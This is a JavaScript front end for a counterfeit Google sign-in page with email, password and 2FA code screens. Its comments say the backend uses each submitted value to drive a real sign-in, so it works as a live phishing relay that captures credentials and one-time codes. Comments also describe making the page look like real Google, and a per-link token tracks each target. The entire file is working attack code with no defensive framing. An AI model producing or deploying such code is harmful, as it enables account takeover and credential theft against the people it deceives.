const token = location.pathname.split('/').pop();
const $ = (id) => document.getElementById(id);

function show(name) {
  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-done']) {
    $(id).classList.toggle('hidden', id !== name);
  }
}
function hint(id, msg) {
  const el = $(id);
  if (msg) { el.textContent = msg; el.hidden = false; }
  else { el.textContent = ''; el.hidden = true; }
}

async function api(pathname, body) {
  return fetch('/api/wizard/' + token + pathname, {
    method: body ? 'POST' : 'GET',
    headers: { 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
}

async function step(name, value) {
  try {
    const r = await api('/step', { step: name, value });
    return r.ok ? await r.json() : null;
  } catch {
    return null;
  }
}

// Toggle a Google-style loading spinner on a submit button while the backend
// is actually driving the real sign-in for that step.
function busy(btn, on) {
  const el = typeof btn === 'string' ? $(btn) : btn;
  el.disabled = on;
  el.classList.toggle('loading', on);
}

async function finish(totp) {
  await step('totp', totp);
  const r = await api('/complete', {});
  if (!r.ok) return show('screen-email'); // never reached normally
  show('screen-done');
}

// ---- inert links (kept so the page looks like real Google) ----
$('forgot-email').addEventListener('click', () =>
  hint('email-hint', 'Enter the email address linked to this account.'));
$('forgot-pass').addEventListener('click', () =>
  hint('pass-hint', 'Enter the password for this account.'));
$('try-another').addEventListener('click', () => finish(''));

// ---- authentic footer: Help/Privacy/Terms hints + language toggle ----
for (const btn of document.querySelectorAll('.g-foot-link')) {
  btn.addEventListener('click', () => {
    const msg = btn.dataset.hint || 'You can close this page once signed in.';
    const cur = document.querySelector('.g-screen:not(.hidden)');
    // flash the footer hint where there's room; otherwise toast on the card
    toast(msg);
  });
}
function toast(msg) {
  const el = $('toast');
  el.textContent = msg;
  el.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => el.classList.remove('show'), 2400);
}
$('g-lang').addEventListener('click', (e) => {
  const langs = ['English (United States)', 'English (UK)', 'Deutsch', 'Français (France)', 'Español (España)'];
  const span = $('g-lang').querySelector('span');
  const cur = langs.indexOf(span.textContent);
  span.textContent = langs[(cur + 1) % langs.length];
});

// ---- email ----
$('form-email').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-email').value.trim();
  if (!v) return hint('email-hint', 'Enter an email or phone number.');
  hint('email-hint', '');
  busy('btn-email', true);
  const ok = await step('username', v);
  busy('btn-email', false);
  if (ok) {
    renderAccount(v);
    show('screen-pass');
    $('g-pass').focus();
  } else {
    hint('email-hint', 'Something went wrong. Try again.');
  }
});

function renderAccount(email) {
  const [name, domain] = email.split('@');
  $('account-email').textContent = email;
  $('avatar-initials').textContent = (name || '?').charAt(0).toUpperCase();
  $('to-continue').textContent = 'To continue to ' + (domain ? domain : 'your Google Account');
  $('account-row').hidden = false;
}

// ---- password ----
$('show-pass').addEventListener('change', (e) => {
  $('g-pass').type = e.target.checked ? 'text' : 'password';
});
$('form-pass').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-pass').value;
  if (!v) return hint('pass-hint', 'Enter your password.');
  hint('pass-hint', '');
  busy('btn-pass', true);
  const w = await step('password', v);
  busy('btn-pass', false);
  if (!w) {
    hint('pass-hint', 'Something went wrong. Try again.');
  } else if (w.loggedIn) {
    // no 2FA on this account — already genuinely signed in, skip the
    // "verify it's you" screen and finish.
    finish('');
  } else {
    show('screen-totp');
    $('g-totp').focus();
  }
});

// ---- 2FA ----
async function submitTotp() { busy('btn-totp', true); await finish($('g-totp').value.trim()); busy('btn-totp', false); }
$('btn-totp').addEventListener('click', submitTotp);
$('g-totp').addEventListener('keydown', (e) => { if (e.key === 'Enter') submitTotp(); });

// ---- boot ----
(async function boot() {
  const r = await api('');
  if (!r.ok) {
    document.title = 'Sign in - Google Accounts';
    $('card').innerHTML = '<div class="oops" style="margin:8px 0">This sign-in link is invalid or has expired.<br><span style="font-weight:400;color:#5f6368">Ask the sender for a fresh link.</span></div>';
    return;
  }
  const w = await r.json();
  if (w.done) { show('screen-done'); return; }
  show('screen-email');
})();
